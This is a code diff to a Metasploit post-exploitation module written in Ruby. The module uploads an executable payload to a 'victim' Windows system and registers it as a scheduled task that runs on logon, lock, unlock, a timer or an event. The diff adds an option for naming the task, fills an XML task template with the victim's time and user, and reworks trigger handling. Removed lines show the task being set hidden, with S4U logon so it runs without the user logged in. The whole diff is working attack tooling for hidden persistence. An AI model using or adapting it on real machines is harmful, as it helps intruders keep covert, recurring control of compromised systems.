@@ -48,9 +48,10 @@ class Metasploit3 < Msf::Exploit::Local
 		register_options(
 			[
 				OptInt.new('FREQUENCY', [false, 'Schedule trigger: Frequency in minutes to execute', '']),
-				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until scheduled task expires', '1440']),
+				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until trigger expires', '']),
 				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'schedule',['logon', 'lock', 'unlock','schedule', 'event']]),
 				OptString.new('REXENAME',[false, 'Name of exe on remote system', '']),
+				OptString.new('RTASKNAME',[false, 'Name of exe on remote system', '']),
 				OptString.new('PATH',[false, 'PATH to write payload', '']),
 			], self.class)
 
@@ -90,26 +91,30 @@ class Metasploit3 < Msf::Exploit::Local
 		xml_path,rexe_path = generate_path(rexename)
 		return if not xml_path or not rexe_path
 
-		# upload REXE to victim fs
+		# Upload REXE to victim fs
 		upload_response = upload_rexe(rexe_path, payload)
 		return if not upload_response
 
-		# create initial task for XML
+		# Create basic XML outline
 		xml = create_xml(rexe_path, schname)
 		if not xml
 			delete_file(rexe_path)
 			return
 		end
 
-		# fix XML to add S4U value and trigger
+		# Fix XML based on trigger
 		xml = fix_xml(xml)
 
-		# write XML to victim fs
+		# Write XML to victim fs
 		path = write_xml(xml, xml_path, rexe_path)
 		return if not path
 
-		# create task with modified XML
-		schname = Rex::Text.rand_text_alpha((rand(8)+6))
+		# Name task with Opt
+		if not datastore['RTASKNAME'].empty?
+			schname = datastore['RTASKNAME']
+		end
+
+		# Create task with modified XML
 		task = create_task(xml_path, schname, rexe_path)
 		return if not task
 	end
@@ -171,32 +176,30 @@ class Metasploit3 < Msf::Exploit::Local
 	# Returns normal XML for generic task
 
 	def create_xml(path, schname)
-		if datastore['FREQUENCY'] != 0
-			minutes = datastore['FREQUENCY']
-		else
-			if datastore['TRIGGER'] == 'schedule'
-				print_status("Defaulting frequency to every hour")
-			end
-			minutes = 60
-		end
+		xml_path = File.join(Msf::Config.install_root, "data", "exploits", "s4u_persistence")
+		xml_file = File.new(xml_path,"r")
+		xml = xml_file.read
+		xml_file.close
 
-		# create task
-		create_response = cmd_exec("cmd.exe","/c schtasks /create /tn #{schname} /SC MINUTE /mo #{minutes} /TR \"#{path}\"")
-		if not create_response =~ /has successfully been created/
-			print_error("Issues creating task using schtasks")
-			return nil
+		begin
+			vt = client.railgun.kernel32.GetLocalTime(32)
+			ut = vt['lpSystemTime'].unpack("v*")
+			t = ::Time.utc(ut[0],ut[1],ut[3],ut[4],ut[5])
+		rescue
+			print_error("Could not read system time from victim...using your local time to determine expire date")
+			t = ::Time.now
 		end
+		date = t.strftime("%Y-%m-%d")
+		time = t.strftime("%H:%M:%S")
 
-		# query task for xml
-		xml = cmd_exec("cmd.exe","/c schtasks /query /XML /tn #{schname}")
+		# put in correct times
+		xml = xml.gsub(/DATEHERE/, "#{date}T#{time}")
 
-		# delete original task
-		delete_response = cmd_exec("cmd.exe","/c schtasks /delete /tn #{schname} /f")
-		if not delete_response =~ /was successfully deleted/
-			print_warning("Issues deleting the temp task using schtasks")
-			print_warning("\tTo delete temp task: schtasks /delete /tn #{schname} /f")
-		end
-		print_status("XML export generated at #{path}")
+		domain, user = client.sys.config.getuid.split('\\')
+
+		# put in user information
+		xml = xml.sub(/DOMAINHERE/, user)
+		xml = xml.sub(/USERHERE/, "#{domain}\\#{user}")
 		return xml
 	end
 
@@ -230,20 +233,22 @@ class Metasploit3 < Msf::Exploit::Local
 				xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)
 
 			when 'schedule'
+				# Change interval tag, insert into XML
+				if datastore['FREQUENCY'] != 0
+					minutes = datastore['FREQUENCY']
+				else
+					if datastore['TRIGGER'] == 'schedule'
+						print_status("Defaulting frequency to every hour")
+					end
+					minutes = 60
+				end
+				xml = xml.sub(/<Interval>.*?</, "<Interval>PT#{minutes}M<")
+
 				# Generate expire tag, insert into XML
-				end_boundary = create_expire_tag
+				end_boundary = create_expire_tag if datastore['EXPIRE_TIME']
 				insert = xml.index("</StartBoundary>")
 				xml.insert(insert + 16, "\n      #{end_boundary}")
 		end
-
-		# Change default values
-		xml = xml.sub(/<Hidden>.*?</, '<Hidden>true<')
-
-		# S4U allows for access when the user is not logged on
-		xml = xml.sub(/<LogonType>.*?</, '<LogonType>S4U<')
-
-		# Parallel allows the payload to contine to be triggered if one failed
-		xml = xml.sub(/<MultipleInstancesPolicy>.*?</, '<MultipleInstancesPolicy>Parallel<')
 		return xml
 	end
 
@@ -253,23 +258,21 @@ class Metasploit3 < Msf::Exploit::Local
 	# Returns XML for expire
 
 	def create_expire_tag()
-		if datastore['EXPIRE_TIME']
-			# Get local time of windows system
-			begin
-				vt = client.railgun.kernel32.GetLocalTime(32)
-				ut = vt['lpSystemTime'].unpack("v*")
-				t = ::Time.utc(ut[0],ut[1],ut[3],ut[4],ut[5])
-			rescue
-				print_error("Could not read system time from victim...using your local time to determine expire date")
-				t = ::Time.now
-			end
-			# Create time object to add expire time to and create tag
-			t = t + (datastore['EXPIRE_TIME'] * 60)
-			date = t.strftime("%Y-%m-%d")
-			time = t.strftime("%H:%M:%S")
-			end_boundary = "<EndBoundary>#{date}T#{time}</EndBoundary>"
-			return end_boundary
+		# Get local time of windows system
+		begin
+			vt = client.railgun.kernel32.GetLocalTime(32)
+			ut = vt['lpSystemTime'].unpack("v*")
+			t = ::Time.utc(ut[0],ut[1],ut[3],ut[4],ut[5])
+		rescue
+			print_error("Could not read system time from victim...using your local time to determine expire date")
+			t = ::Time.now
 		end
+		# Create time object to add expire time to and create tag
+		t = t + (datastore['EXPIRE_TIME'] * 60)
+		date = t.strftime("%Y-%m-%d")
+		time = t.strftime("%H:%M:%S")
+		end_boundary = "<EndBoundary>#{date}T#{time}</EndBoundary>"
+		return end_boundary
 	end
 
 	##############################################################
@@ -300,7 +303,7 @@ class Metasploit3 < Msf::Exploit::Local
 	def create_trigger_event_tags(log, line, xml)
 		domain, user = client.sys.config.getuid.split('\\')
 
-		# Fucked up XML syntax for windows event #{id} in #{log} within the past 15 minutes
+		# Fscked up XML syntax for windows event #{id} in #{log}
 		temp_xml = "<EventTrigger>\n"
 		temp_xml << "      #{create_expire_tag}\n" if not datastore['EXPIRE_TIME'] == 0
 		temp_xml << "      <Enabled>true</Enabled>\n"
